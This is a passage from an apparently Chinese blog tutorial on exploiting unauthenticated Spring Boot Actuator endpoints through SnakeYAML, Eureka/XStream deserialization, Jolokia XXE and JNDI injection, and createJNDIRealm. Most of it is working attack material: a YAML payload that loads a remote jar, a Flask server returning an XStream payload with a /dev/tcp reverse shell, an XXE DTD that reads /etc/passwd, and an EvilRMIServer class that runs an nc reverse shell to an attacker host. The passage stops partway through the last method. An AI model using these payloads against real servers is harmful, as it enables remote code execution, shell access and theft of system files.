<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [<span class="string">&quot;http://192.168.233.243/example.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p>在根目录下放置example.jar包(需要执行的命令)，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a></p>
<p>(代码也在网盘里面，为springcloud-snakeyaml-rce&#x2F;yaml-payload&#x2F;src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java)</p>
<p>只需将exec()里面修改为执行的命令即可</p>
<p>![image-20210827163442633](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210827163442633.png)</p>
<p>将其进行打包成jar包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf example.jar -C src/ .</span><br></pre></td></tr></table></figure>



<p>使用python快速开启http服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>通过burp抓包并修改请求报文</p>
<p>![image-20210829225702843](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210829225702843.png)</p>
<p>然后修改请求报文&#x2F;refresh，刷新配置文件</p>
<p>![image-20210829230055895](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210829230055895.png)</p>
<p>反弹shell成功</p>
<p>![image-20210829230223141](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210829230223141.png)</p>
<h5 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h5><ol>
<li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li>
<li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li>
<li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li>
<li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li>
<li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li>
<li>实例化类时执行恶意代码，造成 RCE 漏洞</li>
</ol>
<p>分析详情参见下文</p>
<p><a href="https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/">Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记</a></p>
<h4 id="2-3-Eureka服务漏洞"><a href="#2-3-Eureka服务漏洞" class="headerlink" title="2.3.Eureka服务漏洞"></a><strong>2.3.Eureka服务漏洞</strong></h4><p>Eureka服务漏洞需要存在两个包</p>
<blockquote>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-boot-starter-actuator（/refresh刷新配置需要）  </span><br><span class="line">spring-cloud-starter-netflix-eureka-client（功能依赖）</span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标使用的  <code>eureka-client</code> &lt; 1.8.7（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li>
<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
</ul>
<blockquote>
<p>  Eureka-Client&lt;1.8.7，eureka服务多用于netflix组件中，可通过在&lt;<br>  span&#x3D;””&gt;&#x2F;env中搜寻Netflix关键字判断时候可能存在Eureka服务</p>
</blockquote>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;7af2a3cf6a49f6b649e1aacbeb4aacf7.png)</p>
<p>Eureka服务属性被设置为恶意的外部Eureka server<br>URL地址时，通过&#x2F;refresh会触发目标机器请求远程URL,Eureka server<br>URL可通过在&#x2F;env处POST数据进行更改</p>
<h5 id="利用方法-4"><a href="#利用方法-4" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一:  架设响应Xstream payload的网站</strong></p>
<p>提供一个依赖 Flask 并符合要求的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py">python 脚本示例</a>，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p>
<p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p>
<p><strong>步骤二：监听反弹 shell 的端口</strong></p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤四：刷新配置</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用实例-2"><a href="#利用实例-2" class="headerlink" title="利用实例"></a>利用实例</h5><p>使用python 在服务器上搭建一个响应XStream payload的Web服务，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python# coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span>)@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span>(<span class="params">path</span>):</span>    </span><br><span class="line">xml = <span class="string">&quot;&quot;&quot;&lt;linked-hash-set&gt;  &lt;jdk.nashorn.internal.objects.NativeString&gt;    </span></span><br><span class="line"><span class="string">&lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;      &lt;dataHandler&gt;        </span></span><br><span class="line"><span class="string">&lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;          </span></span><br><span class="line"><span class="string">&lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;            </span></span><br><span class="line"><span class="string">&lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;                    </span></span><br><span class="line"><span class="string">&lt;command&gt;                       </span></span><br><span class="line"><span class="string">&lt;string&gt;/bin/bash&lt;/string&gt;                       </span></span><br><span class="line"><span class="string">&lt;string&gt;-c&lt;/string&gt;                      </span></span><br><span class="line"><span class="string">&lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/192.168.233.247/1234 0&gt;&amp;amp;1&lt;/string&gt;                    </span></span><br><span class="line"><span class="string">&lt;/command&gt;                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;                  &lt;/next&gt;                </span></span><br><span class="line"><span class="string">&lt;/iter&gt;                </span></span><br><span class="line"><span class="string">&lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;                  &lt;method&gt;                    </span></span><br><span class="line"><span class="string">&lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;                    &lt;name&gt;start&lt;/name&gt;                    </span></span><br><span class="line"><span class="string">&lt;parameter-types/&gt;                 </span></span><br><span class="line"><span class="string"> &lt;/method&gt;                  </span></span><br><span class="line"><span class="string">&lt;name&gt;foo&lt;/name&gt;                </span></span><br><span class="line"><span class="string">&lt;/filter&gt;                </span></span><br><span class="line"><span class="string">&lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;             </span></span><br><span class="line"><span class="string"> &lt;/serviceIterator&gt;              </span></span><br><span class="line"><span class="string">&lt;lock/&gt;            </span></span><br><span class="line"><span class="string">&lt;/cipher&gt;            </span></span><br><span class="line"><span class="string">&lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;            &lt;ibuffer&gt;&lt;/ibuffer&gt;          </span></span><br><span class="line"><span class="string">&lt;/is&gt;        </span></span><br><span class="line"><span class="string">&lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">&lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">&lt;/value&gt;</span></span><br><span class="line"><span class="string">&lt;/jdk.nashorn.internal.objects.NativeString&gt;&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span>    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Python3启动web,如下:</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;7622e80d3286c478d7fdf42a216d67d4.png)</p>
<p>使用Burp构造请求报文发送POST请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eureka.client.serviceUrl.defaultZone=http://192.168.233.249/xstream</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;85864c908118a436d542c5dfc3fedba5.png)</p>
<p>刷新配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;e061acae7d5aaf5dd9e36a188a0c7375.png)</p>
<p>kali开启监听端口1234获取反弹shell</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;c2aacb012495255a8681c062a427bc34.png)</p>
<p>注：该漏洞的成功利用与jdk版本有关，此处用的是1.8.0_161</p>
<h5 id="利用原理-2"><a href="#利用原理-2" class="headerlink" title="利用原理"></a>利用原理</h5><ol>
<li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li>
<li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload</li>
<li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li>
</ol>
<p>详细分析参见下文</p>
<p><a href="https://www.freebuf.com/column/234719.html">Spring Boot Actuator从未授权访问到getshell</a></p>
<h4 id="2-4-Jolokia漏洞-XXE"><a href="#2-4-Jolokia漏洞-XXE" class="headerlink" title="2.4.Jolokia漏洞 XXE"></a><strong>2.4.Jolokia漏洞 XXE</strong></h4><h5 id="利用条件-6"><a href="#利用条件-6" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li><p>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</p>
</li>
<li><p>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</p>
</li>
<li><p>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p>
</li>
<li><p>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</p>
</li>
</ul>
<h5 id="利用方法-5"><a href="#利用方法-5" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一:查看已存在的 MBeans</strong></p>
<p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。</p>
<p><strong>步骤二：托管 xml 文件</strong></p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"><span class="comment"># 也可以开启apache或者nginx的http服务将其放在根目录下</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code>  文件，内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;rmi://your-vps-ip:port/jndi&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>步骤三：准备要执行的 Java 代码</strong></p>
<p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code>JNDIObject.java</code>，</p>
<p>使用Maven对其进行编译打包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn clean install</span><br></pre></td></tr></table></figure>

<p><strong>然后将生成的</strong> jar包拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
<p><strong>步骤四：架设恶意 RMI 服务</strong></p>
<p>设置RMI服务的ip地址和开启服务端口8090</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>



<p><strong>步骤五：监听反弹 shell 的端口</strong></p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure>



<p><strong>步骤六：从外部 URL 地址加载日志配置文件</strong></p>
<blockquote>
<p>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p>
</blockquote>
<p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml</span><br></pre></td></tr></table></figure>



<h5 id="利用实例-3"><a href="#利用实例-3" class="headerlink" title="利用实例"></a>利用实例</h5><p>判断是否存在jolokia插件访问<a href="http://ip:port/jolokia/list">http://ip:port/jolokia/list</a> 是否存在</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;4406018ebff3c7de7dd29c07d7e0ccc7.png)</p>
<p>在&#x2F;jolokia&#x2F;list 接口搜索关键字：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ch.qos.logback.classic.jmx.JMXConfigurator和reloadByURL</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;9fc925bb48d7fbc26191d101b9a9adab.png)</p>
<p><strong>读取敏感文件</strong></p>
<p>创建xml文档logback.xml</p>
<p>请求访问fileread.dtd文件，192.168.233.1为服务器ip</p>
<blockquote>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?\&gt;</span><br><span class="line"></span><br><span class="line"> \&lt;!DOCTYPE a [ \&lt;!ENTITY % remote SYSTEM</span><br><span class="line"></span><br><span class="line">  &quot;http://192.168.233.1/filereaed.dtd&quot;\&gt;%remote;%int;]\&gt;</span><br><span class="line"></span><br><span class="line">\&lt;a\&gt;&amp;trick;\&lt;/a\&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>将该xml放到服务器上，用于访问获取</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;2c2311a2d34ee6ff782221a35d920431.png)</p>
<p>创建文件fileread.dtd，读取&#x2F;etc&#x2F;passwd文件</p>
<blockquote>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % d SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  </span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#x27;:%d;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;f2d4373437722b5f3d7ac97085b66953.png)</p>
<p>在外部构造url访问，Payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.233.247:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/192.168.233.1!/logback.xml</span><br></pre></td></tr></table></figure>

<p>可以看到返回的信息中存在etc&#x2F;passwd的用户信息</p>
<p>如红框中所示</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;66e6d7ece8ce1dbfd308720f8cbbb751.png)</p>
<p><strong>远程代码执行</strong></p>
<p>可以在logback.xml中使用insertFromJNDI标签，这个标签允许我们从 JNDI<br>加载变量，导致了rce漏洞产生。<br>rce的流程主要分为4步。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.  构造 Get 请求访问目标，使其去外部服务器加载恶意 logback.xml 文件。</span><br><span class="line"></span><br><span class="line">2.  解析 logback.xml 时，最终会触发 InitialContext.lookup(URI) 操作，而URI</span><br><span class="line">    为恶意 RMI 服务地址。</span><br><span class="line"></span><br><span class="line">3.  恶意 RMI 服务器向目标返回一个 Reference 对象，Reference</span><br><span class="line">    对象中指定了目标本地存在的 BeanFactory 类，以及Bean Class</span><br><span class="line">    的类名、属性、属性值（这里为 ELProcessor 、x、eval(...))。</span><br><span class="line"></span><br><span class="line">4.  目标在进行 lookup() 操作时，会动态加载并实例化 BeanFactory 类，接着调用</span><br><span class="line">    factory.getObjectInstance() 方法，通过反射的方式实例化 Reference</span><br><span class="line">    所指向的任意 Bean Class，并且会调用 setter</span><br><span class="line">    方法为所有的属性赋值。对应我们的代码，最终调用 setter</span><br><span class="line">    方法的时候，就是执行如下代码：</span><br><span class="line"></span><br><span class="line">ELProcessor.eval(\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc evil-server-ip port &gt;/tmp/f&#x27;]).start()\&quot;</span><br></pre></td></tr></table></figure>



<p>而 ELProcessor.eval() 会对 EL 表达式（这里为反弹 shell）进行求值，最终达到 RCE<br>的效果。</p>
<p>下面为编写的java代码漏洞利用poc，指定了反弹shell的ip地址和端口及其开启rmi服务的端口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 8090&quot;</span>);<span class="comment">//RMI服务地址为8090</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.249 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">         <span class="comment">//反弹shell地址为192.168.233.249，端口为1234</span></span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;jndi&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>使用maven对java代码进行编译打包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令:mvn clean install</span><br></pre></td></tr></table></figure>

<p>打包成功</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;d4957a0c50e626f62d06f5fc2853ddbb.png)</p>
<p>将上面打包的jar放到kali上，开启8090端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如下命令:java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;d1dffff25909ba0840e280f858d32e0d.png)</p>
<p>使用nc开启监听1234端口</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;b531b990d627d9069028dcea04343c27.png)</p>
<p>下面为在服务器上放置的logback.xml用来请求kaLi开启的8090端口建立连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line"></span><br><span class="line">&lt;insertFromJNDI env-entry-name=&quot;rmi://192.168.233.249:8090/jndi&quot; as=&quot;appName&quot;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>



<p>在浏览器中从外部构造url访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.233.247:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!192.168.233.1!/logback.xml</span><br></pre></td></tr></table></figure>



<p>浏览器返回结果如下:</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;1e7783f49e5d0511d34e21997052151e.png)</p>
<p>可以看到kali下获取反弹的shell</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;a288f1cbdbcfd6a43eb37a0aa8362ef4.png)</p>
<p><strong>注: 如果目标成功请求了example.xml并且 marshalsec 也接收到了目标请求，但是目标没有请求JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</strong></p>
<h5 id="利用原理-3"><a href="#利用原理-3" class="headerlink" title="利用原理"></a><strong>利用原理</strong></h5><ul>
<li><p>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用<br>ch.qos.logback.classic.jmx.JMXConfigurator 类的 reloadByURL 方法</p>
</li>
<li><p>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</p>
</li>
<li><p>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</p>
</li>
<li><p>xml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI 服务器地址</p>
</li>
<li><p>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</p>
</li>
</ul>
<p>详细分析参见下文:</p>
<p><a href="https://xz.aliyun.com/t/4258">spring boot actuator rce via jolokia</a></p>
<h4 id="2-5-createJNDIRealm-RCE"><a href="#2-5-createJNDIRealm-RCE" class="headerlink" title="2.5.createJNDIRealm RCE"></a>2.5.createJNDIRealm RCE</h4><h5 id="利用条件-7"><a href="#利用条件-7" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
<li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
<li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141&#x2F;7u131&#x2F;8u121(RMI)，但相关环境可绕过</li>
</ul>
<h5 id="利用方法-6"><a href="#利用方法-6" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：查看已存在的 MBeans</strong></p>
<p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>type=MBeanFactory</code> 和 <code>createJNDIRealm</code> 关键词。</p>
<p><strong>步骤二：准备要执行的 Java 代码</strong></p>
<p>编写优化过后的用来反弹 shell 的 Java代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port xxxxx&quot;);//RMI服务监听地址</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xxx.xxx.xxx.xxx xxxx &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         //反弹shell地址为xxx.xxx.xxx.xxx(ip地址)，端口为xxxx(端口地址)</span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三： 打包java代码文件</strong></p>
<p>将编辑好的java代码打包成jar包</p>
